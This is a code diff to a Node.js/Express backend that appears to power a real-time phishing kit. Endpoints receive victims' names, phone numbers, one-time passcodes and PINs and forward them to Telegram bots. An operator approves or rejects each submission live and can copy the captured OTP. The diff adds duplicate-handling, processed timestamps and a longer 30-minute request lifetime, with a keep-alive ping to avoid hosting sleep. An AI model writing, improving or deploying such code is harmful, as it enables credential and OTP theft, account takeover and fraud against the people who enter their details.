@@ -8,11 +8,14 @@ const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_DOMAIN;
 
 // ---------- IN-MEMORY STORES ----------
-const phoneRequests = {};
+const phoneRequests = {};        // value: true/false or null
 const otpRequests = {};
 const pinRequests = {};
-const requestMeta = {};
-const requestTimestamps = {};
+const requestMeta = {};          // { name, phone, botId, otp?, ... }
+const requestTimestamps = {};    // creation timestamp
+
+// We'll also store when each request was processed (to show age)
+const processedTimestamps = {};  // { requestId: Date }
 
 // ---------- BOTS ----------
 const bots = [];
@@ -99,7 +102,7 @@ async function setAllWebhooks() {
   for (const bot of bots) await setWebhook(bot);
 }
 
-// ---------- KEEP-ALIVE (prevents free-tier sleep) ----------
+// ---------- KEEP-ALIVE ----------
 async function pingSelf() {
   if (!DOMAIN) return;
   try {
@@ -121,6 +124,7 @@ app.post('/submit-phone', (req, res) => {
     phoneRequests[requestId] = null;
     requestMeta[requestId] = { name, phone, botId };
     requestTimestamps[requestId] = Date.now();
+    processedTimestamps[requestId] = null;
 
     sendTelegram(
       bot,
@@ -141,7 +145,6 @@ app.post('/submit-phone', (req, res) => {
 
 app.get('/check-phone/:id', (req, res) => {
   const result = phoneRequests[req.params.id];
-  // 🔥 FIX: return { approved: true } instead of { redirect: 'link.html' }
   if (result === true) return res.json({ approved: true });
   if (result === false) return res.json({ approved: false });
   res.json({ approved: null });
@@ -158,6 +161,7 @@ app.post('/submit-otp', (req, res) => {
     otpRequests[requestId] = null;
     requestMeta[requestId] = { name, phone, otp, botId };
     requestTimestamps[requestId] = Date.now();
+    processedTimestamps[requestId] = null;
 
     sendTelegram(
       bot,
@@ -194,6 +198,7 @@ app.post('/submit-pin', (req, res) => {
     pinRequests[requestId] = null;
     requestMeta[requestId] = { name, phone, botId };
     requestTimestamps[requestId] = Date.now();
+    processedTimestamps[requestId] = null;
 
     sendTelegram(
       bot,
@@ -231,15 +236,44 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const [action, requestId] = cb.data.split(':');
     const meta = requestMeta[requestId];
 
+    // ---------- Check if request exists ----------
     if (!meta) {
       await answerCallback(bot, cb.id, {
-        text: '⏳ This request has expired or already been processed.',
+        text: '⏳ This request has expired (30 min limit) or was already processed. Please start a new application.',
         show_alert: true
       });
       return res.sendStatus(200);
     }
 
-    // ---------- Copy OTP ----------
+    // ---------- Check if already processed (prevent duplicates) ----------
+    let alreadyProcessed = false;
+    let statusMessage = '';
+    if (action.startsWith('phone_')) {
+      if (phoneRequests[requestId] !== null) {
+        alreadyProcessed = true;
+        statusMessage = phoneRequests[requestId] ? '✅ already approved' : '❌ already rejected';
+      }
+    } else if (action.startsWith('otp_')) {
+      if (otpRequests[requestId] !== null) {
+        alreadyProcessed = true;
+        statusMessage = otpRequests[requestId] ? '✅ already approved' : '❌ already rejected';
+      }
+    } else if (action.startsWith('pin_')) {
+      if (pinRequests[requestId] !== null) {
+        alreadyProcessed = true;
+        statusMessage = pinRequests[requestId] ? '✅ already approved' : '❌ already rejected';
+      }
+    }
+
+    if (alreadyProcessed) {
+      await answerCallback(bot, cb.id, {
+        text: `⏳ This request was already ${statusMessage}.`,
+        show_alert: true
+      });
+      return res.sendStatus(200);
+    }
+
+    // ---------- Copy OTP (special action) ----------
     if (action === 'copy_otp') {
       if (meta.otp) {
         await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
@@ -281,6 +315,9 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
       feedback = '❌ PIN rejected';
     }
 
+    // Store processed timestamp
+    processedTimestamps[requestId] = Date.now();
+
     if (feedback) {
       await sendTelegram(
         bot,
@@ -321,10 +358,10 @@ app.get('/debug/bot', (req, res) => {
   });
 });
 
-// ---------- CLEANUP OLD REQUESTS (TTL) ----------
+// ---------- CLEANUP OLD REQUESTS (TTL = 30 minutes) ----------
 setInterval(() => {
   const now = Date.now();
-  const TTL = 10 * 60 * 1000; // 10 minutes
+  const TTL = 30 * 60 * 1000; // 30 minutes
   for (const [id, ts] of Object.entries(requestTimestamps)) {
     if (now - ts > TTL) {
       delete phoneRequests[id];
@@ -332,6 +369,7 @@ setInterval(() => {
       delete pinRequests[id];
       delete requestMeta[id];
       delete requestTimestamps[id];
+      delete processedTimestamps[id];
     }
   }
 }, 60000);
